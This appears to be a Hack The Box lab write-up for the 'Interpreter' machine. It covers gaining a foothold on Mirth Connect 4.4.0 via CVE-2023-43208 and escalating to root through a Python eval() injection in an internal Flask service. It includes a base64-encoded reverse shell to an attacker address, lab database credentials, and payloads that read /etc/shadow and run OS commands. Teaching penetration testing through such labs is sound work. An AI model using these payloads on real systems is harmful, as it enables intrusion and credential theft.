# Interpreter - Hack The Box Writeup

**Difficulty**: Medium
**OS**: Linux (Debian 12)
**Key Topics**: Mirth Connect, CVE-2023-43208 (Pre-Auth RCE), MySQL Enumeration, Python `eval()` Injection

---

## Summary

Interpreter is a Linux box running **Mirth Connect 4.4.0**, a healthcare integration engine. Initial access is gained via **CVE-2023-43208**, a pre-authentication remote code execution vulnerability exploiting XStream deserialization. Post-exploitation enumeration of the Mirth MySQL database reveals an internal Flask application running as root that processes patient data. Privilege escalation is achieved by exploiting a Python `eval()` injection in the Flask app's input processing, where curly braces are stripped rather than blocked, allowing arbitrary code execution as root.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -Pn -p- 10.129.6.105
```

| Port  | Service       | Version                             |
|-------|---------------|-------------------------------------|
| 22    | SSH           | OpenSSH 9.2p1 Debian 2+deb12u7     |
| 80    | HTTP          | Jetty                               |
| 443   | HTTPS         | Jetty (SSL)                         |
| 6661  | TCP           | Mirth Connect MLLP Listener (HL7)   |

### Web Enumeration

Navigating to port 80/443 reveals the **Mirth Connect Administrator** login page. The SSL certificate leaks the hostname `mirth-connect`, which is added to `/etc/hosts`.

The Mirth Connect version can be identified via an unauthenticated API endpoint:

```bash
curl -k -H "X-Requested-With: XMLHttpRequest" https://mirth-connect/api/server/version
# Returns: 4.4.0
```

Default credentials (`admin:admin`) do not work.

---

## Initial Access — CVE-2023-43208 (Pre-Auth RCE)

**Mirth Connect 4.4.0** is vulnerable to **CVE-2023-43208**, a pre-authentication remote code execution via XStream deserialization on the `/api/users` endpoint. This is a patch bypass for CVE-2023-37679.

Using the [jakabakos PoC](https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc):

```bash
# Start listener
nc -lvnp 4444
```

Java's `Runtime.exec()` does not support shell redirections, so the reverse shell command must be base64-encoded and wrapped in brace expansion:

```bash
# Base64-encoded: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
python3 CVE-2023-43208.py -u https://mirth-connect \
  -c "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNzcvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}"
```

This provides a shell as the **mirth** user.

---

## Post-Exploitation Enumeration

### Local Enumeration

As the `mirth` user, initial enumeration reveals:
- No sudo privileges
- No exploitable SUID binaries
- No access to `/home/sedric/`
- Mirth Connect installed at `/usr/local/mirthconnect/`

### Mirth Configuration

The Mirth properties file at `/usr/local/mirthconnect/conf/mirth.properties` contains database credentials and keystore passwords:

```
database = mysql
database.url = jdbc:mysql://localhost:3306/mirthdb
database.username = mirthdb
database.password = MirthPass123!
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass = tAuJfQeXdnPw
```

### MySQL Enumeration

Connecting to the database:

```bash
mysql -u mirthdb -p'MirthPass123!' -D mc_bdd_prod
```

The **PERSON** table contains a user `sedric` with a hashed password (not crackable). However, the critical discovery is in the **CHANNEL** table, which reveals the full Mirth integration pipeline:

1. **Source**: Port 6661 (TCP/MLLP) receives HL7v2 messages
2. **Transformer**: Converts HL7 → XML (patient data extraction)
3. **Destination**: POSTs the XML to `http://127.0.0.1:54321/addPatient`

This exposes a hidden internal Flask application running on port 54321.

### Internal Flask Application

Further enumeration confirms:
- **Werkzeug/2.2.2 Python/3.11.2** (Flask)
- Running as **root** via a systemd service
- The application (`notif.py`) accepts XML patient data at `POST /addPatient`

The response format is:
```
Patient {fname} {lname} ({gender}), {age} years old, received from {sender_app} at {timestamp}
```

---

## Privilege Escalation — Python eval() Injection

### Input Validation Analysis

Testing various characters in the patient fields reveals the filtering rules:

| Status    | Characters                                            |
|-----------|-------------------------------------------------------|
| **Blocked** | `; \| \` $ \ { } [ ] , : (space) # @ ! * ~ ^ ?`   |
| **Allowed** | `( ) . _ ' " + = / letters digits`                  |

Critically, **curly braces `{}` are stripped (not blocked)**. The content inside braces is passed through Python's `eval()` function — this is hinted at by the box name "Interpreter."

### Confirming eval() Injection

Sending `{7+7}` in the `firstname` field returns `14` in the response, confirming server-side evaluation. Errors from invalid expressions leak as `[EVAL_ERROR]` messages, further confirming the `eval()` sink.

### Exploitation

Since the application runs as root, `eval()` injection provides full root-level code execution:

```python
import http.client

# Payload in the firstname field — braces are stripped, content is eval'd
payload = "{open('/root/root.txt').read()}"

xml = f"""<patient>
  <timestamp>20250921</timestamp>
  <sender_app>WEBAPP</sender_app>
  <id>1</id>
  <firstname>{payload}</firstname>
  <lastname>test</lastname>
  <birth_date>01/01/2000</birth_date>
  <gender>M</gender>
</patient>"""

conn = http.client.HTTPConnection('127.0.0.1', 54321)
conn.request('POST', '/addPatient', body=xml, headers={'Content-Type': 'text/plain'})
resp = conn.getresponse()
print(resp.read().decode())
```

### Useful Payloads

```python
# Read files as root
{open('/home/sedric/user.txt').read()}
{open('/root/root.txt').read()}
{open('/etc/shadow').read()}

# Command execution as root
{__import__('os').popen('id').read()}
```

---

## Flags

| Flag | Hash                                             |
| ---- | ------------------------------------------------ |
| User | `2bdd1c08b73debe36bf89d0f11716dc2`               |
| Root | Retrieved via eval injection on `/root/root.txt` |
 

---

## Attack Path Summary

```
Nmap Scan
  └─> Mirth Connect 4.4.0 on ports 80/443
        └─> CVE-2023-43208 (XStream Deserialization, Pre-Auth RCE)
              └─> Shell as "mirth" user
                    └─> Mirth config → MySQL creds (MirthPass123!)
                          └─> CHANNEL table → hidden Flask app on :54321
                                └─> Python eval() injection in patient firstname
                                      └─> Root shell / flag retrieval
```
---
## Key Takeaways

1. **Enumerate databases thoroughly** — The Mirth CHANNEL table was the pivot point that revealed the internal Flask service. Without it, the privesc path would have been invisible.
2. **Internal services running as root are high-value targets** — The Flask app on localhost:54321 was not externally accessible but ran with root privileges.
3. **Stripping vs. blocking input** — The application stripped curly braces instead of rejecting the input, allowing the content inside to reach `eval()`. Proper input validation should reject or escape, not silently remove.
4. **The box name is a hint** — "Interpreter" refers to the Python interpreter and `eval()` injection.
5. **Java `Runtime.exec()` quirks** — Shell redirections don't work directly; base64 brace encoding is a reliable workaround for reverse shells.
